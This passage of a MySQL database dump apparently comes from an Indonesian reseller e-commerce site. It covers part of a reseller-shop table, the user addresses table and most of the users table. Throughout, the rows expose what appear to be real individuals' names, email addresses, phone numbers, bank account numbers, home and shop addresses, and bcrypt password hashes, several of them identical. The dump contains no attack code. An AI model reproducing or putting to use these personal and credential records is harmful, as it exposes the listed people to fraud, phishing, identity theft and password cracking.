(30,44,'https://fatboylous.com','fatboylous','dedykurniawan1414@gmail.com','082381396363','466-0151-009','Dedy Kurniawan','bca','active',4,'2019-08-06 06:57:18','2019-08-20 03:59:07',NULL,NULL),
(31,45,'https://7Clovershop.com','7clovers','dandyg8@gmail.com','082284884665','061-3081-817','Dandi gonawan','bca','active',NULL,'2019-08-06 07:55:35','2019-08-06 07:55:35',NULL,NULL),
(32,46,'https://tokoboss79.com','Toko Boss','bostono2013@gmail.com','\'085264122588','821-0377-833','Bostono','bca','active',4,'2019-08-07 04:06:40','2019-08-14 09:27:41',NULL,NULL),
(33,47,'https://bebocollection.com','bebo collection','mariomultitrans@gmail.com','083191077888','326-2127-700','Antonius Mario Lombardi','bca','active',3,'2019-08-07 12:11:48','2019-08-07 12:12:11',NULL,NULL),
(34,49,'https://grachecollection.com','grache collection','lilychen991@gmail.com','085272255070','340-3625-805','Tan Mi yati','bca','active',NULL,'2019-08-08 08:24:06','2019-08-08 08:24:06',NULL,NULL),
(35,55,'https://mytasbatam.com','my tas batam','vantherev27@gmail.com','08219292447','139-2430-487','Van Rudolfo','bca','active',4,'2019-08-09 03:36:10','2019-08-09 03:39:09',NULL,NULL),
(36,72,'https://lidscollections.com','Lidscollection','lidslangkeru@gmail.com','081239149301','7700113749','lidia sari','bca','active',3,'2019-08-15 08:59:06','2019-08-16 02:51:13',NULL,NULL);

/*Table structure for table `user_addresses` */

DROP TABLE IF EXISTS `user_addresses`;

CREATE TABLE `user_addresses` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) DEFAULT NULL,
  `order_id` bigint(20) DEFAULT NULL,
  `user_addresses` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `shipping_package` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `title` varchar(99) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `subdistrict` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `address` text COLLATE utf8mb4_unicode_ci,
  `city` varchar(99) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `province` varchar(99) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `zip_code` varchar(10) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `contact_person` varchar(199) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `is_main_address` tinyint(1) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `user_addresses` */

insert  into `user_addresses`(`id`,`user_id`,`order_id`,`user_addresses`,`shipping_package`,`phone`,`title`,`subdistrict`,`address`,`city`,`province`,`zip_code`,`contact_person`,`is_main_address`,`created_at`,`updated_at`) values 
(1,69,1,NULL,NULL,'081515151515','Alamat utama','2622','KOMPLEK GREENLAND BLOK O 2. BATAM CENTER','189','6','29411','huhu',NULL,NULL,NULL),
(2,69,2,NULL,NULL,'08136446447','Alamat utama','3525','KOMPLEK GREENLAND BLOK O 2. BATAM CENTER','249','10','29411','hihi',NULL,'2019-08-14 12:58:12','2019-08-14 12:58:12'),
(3,69,3,NULL,NULL,'08167542812','Alamat utama','1021','KOMPLEK GREENLAND BLOK O 2. BATAM CENTER','77','7','29411','oooo',NULL,'2019-08-14 13:23:11','2019-08-14 13:23:11'),
(4,70,4,NULL,NULL,'082192924474','Alamat utama','673','Komplek ruko citra indah blok A5 No. 9-10','48','17','14992','van',NULL,'2019-08-14 13:51:23','2019-08-14 13:51:23'),
(5,2,7,NULL,NULL,'2929292929','Alamat utama','1461','test aja','106','3','29800','Dex Ty',NULL,'2019-08-14 14:33:59','2019-08-14 14:33:59'),
(6,69,8,NULL,NULL,'081374864479','Alamat utama','674','KOMPLEK GREENLAND BLOK O 2. BATAM CENTER','48','17','29411','resni',NULL,'2019-08-14 15:09:05','2019-08-14 15:09:05'),
(7,2,7,NULL,NULL,'123123123','Alamat utama','5570','Medan Timur','403','3','11720','Muhardin',NULL,'2019-08-15 09:24:27','2019-08-15 09:24:27'),
(8,2,7,NULL,NULL,'081372823564','Alamat utama','3202','Jl. Purwosari','226','18','29453','PT. Rippleindo Gapura',NULL,'2019-08-15 09:25:09','2019-08-15 09:25:09'),
(9,2,7,NULL,NULL,'081372823564','Alamat utama','551','Jl. Purwosari','39','5','29453','PT. Rippleindo Gapura',NULL,'2019-08-15 09:39:12','2019-08-15 09:39:12'),
(10,47,11,NULL,NULL,'083191077888','Alamat utama','673','Komplek Panatramas \r\nJl. S Parman Blok E No. 9-10 Duri angkan\r\nsei beduk tanjung Piayu','48','17',NULL,'Antonius Mario Lombardi',NULL,'2019-08-19 11:17:37','2019-08-19 11:17:37'),
(11,47,11,NULL,NULL,'083191077888','Alamat utama','683','Komp. Panatra Mas \r\nJln. S Parman. Blok E9-10 Duri Angkang\r\nSei Beduk Tanjung Piayu','48','17',NULL,'Antonius Mario Lombardi',NULL,'2019-08-19 15:01:16','2019-08-19 15:01:16'),
(12,47,11,NULL,NULL,'083181077888','Alamat utama','673','Komp Ruko. Panatra Mas\r\nJln. S. Parman Blok E 9-10 Duri angkang\r\nSei Beduk. Tanjung Piayu','48','17',NULL,'Antonius Mario Lombardi',NULL,'2019-08-21 12:37:34','2019-08-21 12:37:34'),
(13,75,14,NULL,NULL,'081364446442','Alamat utama','6501','KOMPLEK GREENLAND BLOK O 2. BATAM CENTER','471','8','29411','tina',NULL,'2019-08-21 13:12:49','2019-08-21 13:12:49'),
(14,77,15,NULL,NULL,'08999999999','Alamat utama','673','batam no.3','48','17','29400','ika',NULL,'2019-08-21 13:20:34','2019-08-21 13:20:34'),
(15,78,17,NULL,NULL,'081364446442','Alamat utama','4914','KOMPLEK GREENLAND BLOK O 2. BATAM CENTER','350','26','29411','fiyya',NULL,'2019-08-23 11:16:23','2019-08-23 11:16:23'),
(16,50,18,NULL,NULL,'082384851111','Alamat utama','674','Perum Bambu Kuning Blok B 16 no 19, batu aji','48','17','29438','Anindia putri',NULL,'2019-08-25 20:12:56','2019-08-25 20:12:56'),
(17,19,20,NULL,NULL,'085263131963','Alamat utama','673','Komp. Ruko Grand Niaga Mas Blok B No. 91','48','17','29464','BK',NULL,'2019-08-27 11:27:41','2019-08-27 11:27:41'),
(18,19,20,NULL,NULL,'085263131963','Alamat utama','673','Ruko Grand Niaga Mas Blok B-91 Batam Centre','48','17','29464','BK',NULL,'2019-08-27 12:39:17','2019-08-27 12:39:17'),
(19,60,21,NULL,NULL,NULL,'Alamat utama',NULL,NULL,NULL,'1',NULL,NULL,NULL,'2019-08-28 15:18:59','2019-08-28 15:18:59'),
(20,47,11,NULL,NULL,'083191077888','Alamat utama','683','Komp. Ruko Panatra Mas\r\nJl. S. Parman Blok E. No. 9-10 Duri Angkang\r\nSei Beduk Tanjung Piayu','48','17',NULL,'Antonius Mario Lombardi',NULL,'2019-08-28 15:19:35','2019-08-28 15:19:35'),
(21,2,22,NULL,NULL,'81372823564','Alamat utama','2716','Jl. Purwosari','195','12','29453','PT. Rippleindo Gapura',NULL,'2019-08-28 15:31:40','2019-08-28 15:31:40'),
(22,47,24,NULL,NULL,'083191077888','Alamat utama','683','KOMP. Ruko Panatramas\r\nJln. S Parman Blok E9-10 Duri Angkang\r\nSei Beduk. Tanjung Piayu','48','17',NULL,'Antonius Mario Lombardi',NULL,'2019-08-30 16:06:37','2019-08-30 16:06:37');

/*Table structure for table `users` */

DROP TABLE IF EXISTS `users`;

CREATE TABLE `users` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` enum('active','inactive') COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_type` enum('admin','reseller','cs') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'reseller',
  `reseller_type` int(11) DEFAULT NULL,
  `role_id` int(11) DEFAULT NULL,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `no_rekening` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `nama_pemilik` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `nama_bank` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `smscode` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `address` text COLLATE utf8mb4_unicode_ci,
  `kodepos` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `province` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `district` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `city` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=79 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `users` */

insert  into `users`(`id`,`name`,`email`,`email_verified_at`,`password`,`status`,`user_type`,`reseller_type`,`role_id`,`remember_token`,`created_at`,`updated_at`,`no_rekening`,`nama_pemilik`,`nama_bank`,`smscode`,`address`,`kodepos`,`province`,`district`,`city`) values 
(2,'Irman','dexgame88@gmail.com',NULL,'$2y$10$wBeE36O9S2YRYut9CzVRNOrAsMbK1rjzsgSIbe7Dgw.flkH4BzCiy','active','admin',NULL,NULL,NULL,'2019-07-15 08:36:48','2019-07-15 08:36:48',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(10,'Muhardin Hasim','muhardin@gmail.com',NULL,'$2y$10$PN9yZWeRDOHID.2kCC47POkTwV9aDxnVWF/5Ugx1O45rF/wLsGJNS','active','reseller',3,NULL,NULL,'2019-07-30 06:30:35','2019-08-28 14:20:03','123123','123','2www','7254','Batam','123123','17','681','48'),
(15,'Jaka Pramana','jaka_forget@yahoo.co.id',NULL,'$2y$10$LAuw0SIz47VSGUJ/2CwMXuAErEzSnpuQAgl.1kBuQ0Bef97QJcs86','active','reseller',4,NULL,NULL,'2019-08-05 07:13:03','2019-08-05 07:13:03',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(16,'Ayu Arini','aarini31@gmail.com',NULL,'$2y$10$LAuw0SIz47VSGUJ/2CwMXuAErEzSnpuQAgl.1kBuQ0Bef97QJcs86','active','reseller',4,NULL,NULL,'2019-08-05 08:01:33','2019-08-05 08:01:33',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(17,'wito','thewritetalk@gmail.com',NULL,'$2y$10$LAuw0SIz47VSGUJ/2CwMXuAErEzSnpuQAgl.1kBuQ0Bef97QJcs86','active','reseller',3,NULL,NULL,'2019-08-05 09:32:20','2019-08-05 09:32:20',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(19,'Harnadi','harnadi.fnu@gmail.com',NULL,'$2y$10$hqjruHspAWln7O6o0XXiReRx9MCjAIgZ55YoucBAtpWtB1bsAfQKS','active','reseller',4,NULL,NULL,'2019-08-05 09:36:25','2019-08-05 12:47:43',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(20,'Andi Merni','andi.merni@yahoo.com',NULL,'$2y$10$sodYJGBcOEGQSUa1TCziJOnTNl.ycjo9Xh1ffXTfG.HGGpjVZ7Oxy','active','reseller',3,NULL,NULL,'2019-08-05 09:38:01','2019-08-05 09:38:01',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(21,'Dedi Azelan','azlandedi@gmail.com',NULL,'$2y$10$F/kOVYbIDHRCSt6dlhu5ne8DKkX9TjLSlBgYm0iWkiSVSQkoS45JC','active','reseller',3,NULL,NULL,'2019-08-05 09:39:51','2019-08-28 15:09:41','702652237300','Dedi Azelan','CIMB Niaga','1111111',NULL,'29442','17','684','48'),
(22,'Okta Perkasa','okta.perkasa@yahoo.co.id',NULL,'$2y$10$ARbG9wP3AcjRltvLvJhI3Oy55gkNWERSqzaJkNTA9Ghbg4e8fyMgC','active','reseller',3,NULL,NULL,'2019-08-05 09:41:57','2019-08-05 09:41:57',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(26,'Ruby','xiongkho@gmail.com',NULL,'$2y$10$0YNg8M4Bs4/sUFTeeQlciO7tA/Kgq0ol.Ak5poDbVqddw.CO7XLdi','active','reseller',3,NULL,NULL,'2019-08-05 09:47:15','2019-08-05 09:47:15',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(27,'Rachmayati','rachma_28@yahoo.com',NULL,'$2y$10$Y3iJH5.RMh1ygdmyM4A1FeFcOo0t2V6UMHBc/SeZCpR3y8LvuuMFO','active','reseller',3,NULL,NULL,'2019-08-05 09:48:45','2019-08-05 09:48:45',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(28,'Defrizon Putra A','defriputra1@gmail.com',NULL,'$2y$10$YzOMHYLMziR8DTeE.PzT6OYUX0JgVR47gKHfKNQOcIzQj6MAv7k4K','active','reseller',4,NULL,NULL,'2019-08-05 09:50:15','2019-08-28 00:30:57',NULL,NULL,NULL,'2465',NULL,NULL,NULL,NULL,NULL),
(29,'luh ketut tri yani novita','anatawa.grup@gmail.com',NULL,'$2y$10$EIEb2TCYckC39zJjkD4x5O6ryXjEzkb3KfJQMnjGUxFTCi/qJC1Vq','active','reseller',3,NULL,NULL,'2019-08-05 09:51:59','2019-08-05 09:51:59',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(30,'Sylvia Zumarita','robertssonssylvia80@gmail.com',NULL,'$2y$10$lZzkCfuyGgDoPHS9UjjDB.rB/YNIKuc.8Jc0assNIQFBkXGNFZ/qS','active','reseller',3,NULL,NULL,'2019-08-05 10:05:48','2019-08-05 10:53:36',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(31,'Najmiah','niaemma00@gmail.com',NULL,'$2y$10$uh1bCrSl.HJxghzfNTq4quVQK/HwlOUhv3AcCxZuGEsDjyzC04Tqi','active','reseller',3,NULL,NULL,'2019-08-05 10:07:53','2019-08-05 10:07:53',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(32,'Gardang Simbolon','gardangcf@gmail.com',NULL,'$2y$10$YRYYZoWTHGc1JOZ7Zj31vOanyUuo9LuA9pS7IaGJnBeOaPfBNQpcS','active','reseller',4,NULL,NULL,'2019-08-05 10:17:22','2019-08-06 08:06:43',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(33,'Susyana (Joey MJ)','joey.synchen@gmail.com',NULL,'$2y$10$ZPNyEWECMRNnra8PhHjqnumwV4CKAEAnrTS9aoQg4JkSMAJHPdx.a','active','reseller',3,NULL,NULL,'2019-08-05 10:18:58','2019-08-05 10:53:07',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(34,'Sri Hayati','nurviraalyadewi@gmail.com',NULL,'$2y$10$oEtV200rp/Hh/ZCJm8INduelYmE5jI6YS01bw/wtH6HN.Mn0lDhcO','active','reseller',4,NULL,NULL,'2019-08-05 10:21:57','2019-08-06 04:39:41',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(35,'Maya Ridha','ridhaprodg@gmail.com',NULL,'$2y$10$3stAJc6P8H7iUnU1GiuHIO0cGSXLBJxkLXxvQtV.6HBUJA82VujaK','active','reseller',4,NULL,NULL,'2019-08-05 10:25:08','2019-08-05 10:25:08',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(36,'englini','tahulendingenglini@gmail.com',NULL,'$2y$10$3Wbf/nmcvAfqjBj4Pumz0OcCOFeMfYkc3Ea0xSSz.DktPgxsqtwoO','active','reseller',4,NULL,NULL,'2019-08-05 10:31:00','2019-08-08 04:57:53',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(37,'Resni Situmorang','resni.monex@gmail.com',NULL,'$2y$10$k4CI5HFL2.CNk4ArZTWz8.Ezalax7WltxVCl7TveToxRySd9il9Ky','active','reseller',4,NULL,NULL,'2019-08-05 10:36:32','2019-08-13 10:09:29',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(38,'I dewa made anom','abimanyu100976@gmail.com',NULL,'$2y$10$LAuw0SIz47VSGUJ/2CwMXuAErEzSnpuQAgl.1kBuQ0Bef97QJcs86','active','reseller',3,NULL,NULL,'2019-08-05 10:45:06','2019-08-05 10:45:06',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(39,'Luciana','lucianaluciana341.ll@gmail.com',NULL,'$2y$10$Hejp7SFHQ/akkCTCqaOTruqC5SxgyWXqbMXsUBnmRLjkTNq.DVzCS','active','reseller',4,NULL,NULL,'2019-08-05 12:12:47','2019-08-05 12:15:44',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(40,'Robi pangestu','virgin_talk88@gmail.com',NULL,'$2y$10$JmGH2i5rGLSpwGK/SEA8aOJJS35qc7QUvSHxvu0Ph6wlTPImGnXCC','active','reseller',3,NULL,NULL,'2019-08-05 13:04:16','2019-08-05 13:04:16',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(41,'I ketut suardika','suar41@gmail.com',NULL,'$2y$10$EtrgkwvPBsXeYM425cV/z.ZlpF5rZj7fSMnY0XGv.l.VMAgD42dQy','active','reseller',3,NULL,NULL,'2019-08-05 13:07:14','2019-08-05 13:07:14',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(42,'Wawan wirawan','wayanwirawan2016@gmail.com',NULL,'$2y$10$vV2c4JgBfEdfy08USa7nxO9tWolj1NhjktWgzxZQLDUj7udo9eTgm','active','reseller',3,NULL,NULL,'2019-08-05 13:09:49','2019-08-05 13:09:49',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(43,'Ardianto Lahagu','lahagu_ardi@yahoo.com',NULL,'$2y$10$7KRP/ZWBxOAXDBpRN.Y0qeetTInknqNhNmX7nV.t/czMXFWfzpSce','active','reseller',4,NULL,NULL,'2019-08-06 06:32:04','2019-08-29 09:43:17','613192642','Ardianto Lahagu','BCA','1111111',NULL,NULL,NULL,NULL,NULL),
(44,'Dedy Kurniawan','dedykurniawan1414@gmail.com',NULL,'$2y$10$zNKZyQrAal3KWJ7dKkM4Q.FKRhRBq121sshdoUV4o/g2rfDB9bQTy','active','reseller',4,NULL,NULL,'2019-08-06 06:57:18','2019-08-06 06:57:18',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(45,'Dandi gonawan','dandyg8@gmail.com',NULL,'$2y$10$uh1bCrSl.HJxghzfNTq4quVQK/HwlOUhv3AcCxZuGEsDjyzC04Tqi','active','reseller',4,NULL,NULL,'2019-08-06 07:55:35','2019-08-06 07:55:35',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(46,'Bostono','bostono2013@gmail.com',NULL,'$2y$10$DcRyo2/CNbTFMjgFJDYqvOzPhIy2Z77vq7HHZnLaoh1Wk/UzLrCLG','active','reseller',4,NULL,NULL,'2019-08-07 04:06:40','2019-08-07 04:06:40',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(47,'Antonius Mario Lombardi','mariomultitrans@gmail.com',NULL,'$2y$10$B97VKJIR.fBNGfQLmJ38.e8myMWGfwdWLRsDhlXH6BJWSpMr6gDmy','active','reseller',3,NULL,NULL,'2019-08-07 12:11:48','2019-08-07 12:11:48',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(48,'Silvia','silviayeo@yahoo.com',NULL,'$2y$10$iHRjx8fUEijQWe6EuGrq9OH4I9o38jLr4Ks4tggi/BCoZ5dLpy1eO','active','reseller',NULL,NULL,NULL,'2019-08-07 12:53:35','2019-08-07 12:53:35',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(49,'Tan Mi yati','lilychen991@gmail.com',NULL,'$2y$10$49EzePLSUkvaEtdjGE3b6uaKSNx96gO6xJXnNSvHLj5kS19zMOkxy','active','reseller',4,NULL,NULL,'2019-08-08 08:24:06','2019-08-08 08:24:06',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(50,'Anindia putri','anindiaputri@gmail.com',NULL,'$2y$10$fCZka5hoBe3NGXoidQ.3NOPjaIMjoZD/ntTxzHFryagG/6mtyrz0m','active','reseller',NULL,NULL,NULL,'2019-08-08 10:17:46','2019-08-08 10:17:46',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(51,'BK','kwok.note@gmail.com',NULL,'$2y$10$2bSs2msFTSxbCteQW3iFCeClRK2wcpxUK/FIf0nFkBSpz9RiBkhKu','active','reseller',NULL,NULL,NULL,'2019-08-08 10:44:23','2019-08-08 10:44:23',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(52,'evri','resni.situmorang@gmail.com',NULL,'$2y$10$1p4Q91Tm0LBUSZXuRnp53u0tusWYWNJHY2umiyxmrj0kNDJ.JM7nO','active','reseller',NULL,NULL,NULL,'2019-08-08 12:43:16','2019-08-13 10:09:07',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(53,'Ripleindo','ptavjbatam@gmail.com',NULL,'$2y$10$tfUSKto/x4oCRehwvlFpKODDfvOFLUoBVfhDfy4MefPkkSM4Q5xFq','active','reseller',NULL,NULL,NULL,'2019-08-09 00:47:16','2019-08-09 00:47:16',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(54,'nia','wulandarinia30@gmail.com',NULL,'$2y$10$iitUl0LRRSCHohasGZaDpefJz9UpE4VoyvS9cfpajNMHsQRHwDh/W','active','reseller',NULL,NULL,NULL,'2019-08-09 02:39:59','2019-08-09 02:39:59',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(55,'Van Rudolfo','Vantherev27@gmail.com',NULL,'$2y$10$P4ghpeu2WG3TWZ/HJOc36.qS0z1j6KHHVeQuYYgFJmBrhXe2glUWG','active','reseller',4,NULL,NULL,'2019-08-09 03:36:10','2019-08-09 03:38:18',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(56,'Sri hayati','nurviraalyadewi@gmail.c081261048361',NULL,'$2y$10$erVCdTSvGdZ93poB7HZP4.i8VRskka2HI1/CBHtse.EA0AlJOlYLW','active','reseller',NULL,NULL,NULL,'2019-08-09 15:57:34','2019-08-09 15:57:34',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(57,'vhya','oppippovhya@gmail.com',NULL,'$2y$10$dsRGJIElVkv0/KgCrjFCG.FI89kavvyYw32u/xY/7Ezn8LAgndusK','active','reseller',NULL,NULL,NULL,'2019-08-09 15:57:38','2019-08-09 15:57:38',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(59,'Dedy','dexgame89@gmail.com',NULL,'$2y$10$rLp19G75juVDWv9goLWcGOVToNMAtN43J/Ftrz/fuOclhFo8S874u','active','reseller',NULL,NULL,NULL,'2019-08-12 08:04:17','2019-08-12 08:04:17',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(60,'jaka','jaka_forget@yahoo.co.od',NULL,'$2y$10$ELodnkzCufvIYskOmef2nuvqqoVcudOdEu4VPicxT6ALhKTU6Fe52','active','reseller',NULL,NULL,NULL,'2019-08-12 09:37:02','2019-08-12 09:37:02',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(61,'Ardianto Lahagu','lahaguardi8855@gmail.com',NULL,'$2y$10$GlYWoqQlBnB0Mm45SY.34OefyBdfVawT4e8zrRukpwx0DUPwcckMe','active','reseller',NULL,NULL,NULL,'2019-08-12 16:49:51','2019-08-12 16:49:51',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(62,'wulan','wulan@gmail.com',NULL,'$2y$10$GO7YNNuuPBhzCgKDnx6QpetM8vzOP5NEtCJsZzJJc/xzKQUKyt3qq','active','reseller',NULL,NULL,NULL,'2019-08-13 02:48:07','2019-08-13 02:48:07',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(63,'dari','dari@gmail.com',NULL,'$2y$10$fly8jkP5obP6hBDjGcPYw.2dRfbT.XFrxx5t8yW0Pv892YQs9.QTS','active','reseller',NULL,NULL,NULL,'2019-08-13 02:55:41','2019-08-13 02:55:41',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(64,'Evri Herwanti Sinaga','evriiherwantisinaga@gmail.com',NULL,'$2y$10$QypT0GArQqG4ftqIqi5ccu0acYvkrwEaxQ1FfQ/EXUeLkY.fEmKR.','active','reseller',NULL,NULL,NULL,'2019-08-13 02:59:51','2019-08-13 02:59:51',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(65,'Ryan','ryan@gg.com',NULL,'$2y$10$hS7KXZ6o6PV2YVcEuEEuIOgp8DdkN7ydB7DNG7ajhxny6y5WS48Di','active','reseller',NULL,NULL,NULL,'2019-08-13 03:00:59','2019-08-13 03:00:59',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(66,'Rama','rama@gg.com',NULL,'$2y$10$T4QHZDPzBRPv01T6Fvxqe.UsPQmmeOzCgI3.MEZrcUQew.1PjQVs6','active','reseller',NULL,NULL,NULL,'2019-08-13 03:34:17','2019-08-13 03:34:17',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(67,'dEX','dexgame99@gmail.coM',NULL,'$2y$10$Mu0kTb2JgcCZ9pHsLGnPgOu81OM0M5xdxpzrMTSN3CIJLrUrbH45a','active','reseller',NULL,NULL,NULL,'2019-08-13 03:37:19','2019-08-13 03:37:19',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(68,'wulan','dedy@gmail',NULL,'$2y$10$xHNlLlmYiRmIqmSSa.nB6uc7bjmi5KpAiGdib4oo95BtSAd/nkfPG','active','reseller',NULL,NULL,NULL,'2019-08-14 10:06:12','2019-08-14 10:06:12',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(69,'bos','bos@gmail.com',NULL,'$2y$10$9kIS4aqsPw2lmRL5j42k0.GAnSb799iXDbGnOr.Rtydhmn1rbbI0i','active','reseller',NULL,NULL,NULL,'2019-08-14 11:26:50','2019-08-14 11:26:50',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(70,'van','vanrudolfo66891@gmail.com',NULL,'$2y$10$Hdq.YLupQVioOoiuaM0axeQ//sjBTAiA4sNjU2walYWi6PJlxdrY2','active','reseller',NULL,NULL,NULL,'2019-08-14 13:48:48','2019-08-14 13:48:48',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(71,'Okta Perkasa','operkasa@gmail.com',NULL,'$2y$10$7aFzvdzYGHuTjO49g77fU.IXsPUoUTV1X8VeFO0aSxGHOt7knEhk2','active','reseller',NULL,NULL,NULL,'2019-08-14 14:37:59','2019-08-14 14:37:59',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(72,'lidia sari','lidslangkeru@gmail.com',NULL,'$2y$10$wF6I626qaewZZSEUKPD/YuiQFJeIQ.L0ZTFvka4MfArDoG5XSjXlK','active','reseller',3,NULL,NULL,'2019-08-15 08:59:06','2019-08-15 08:59:06',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(73,'xBgyobGEZtHf','hardradepi@gmail.com',NULL,'$2y$10$gHozPhZS0fXZOA8UxkhXU.0vtWSEisFv5wQof15hzjr1V3C//SZji','active','reseller',NULL,NULL,NULL,'2019-08-16 01:00:02','2019-08-16 01:00:02',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(74,'DaleZN','maxsurv@yandex.com',NULL,'$2y$10$o5WJAr6nCUJdQBLXDELD7eElPObox21UWHtX4IYcIcWvk6d5B0rpS','active','reseller',NULL,NULL,NULL,'2019-08-16 04:04:42','2019-08-16 04:04:42',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(75,'tina','tina@gmail.com',NULL,'$2y$10$xo5VsZxkf8YenLT.G/4vaeKQHip2l/DqYzABGjHdY3lm9RMSSTVAq','active','reseller',NULL,NULL,NULL,'2019-08-21 13:11:38','2019-08-21 13:11:38',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(76,'tono','oki@gmail.com',NULL,'$2y$10$d1zlnOym9F.taz7iVbMF8.3Vq15XZrG9sHY2csvhXqAniuLMjvW.W','active','reseller',NULL,NULL,NULL,'2019-08-21 13:15:58','2019-08-21 13:15:58',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
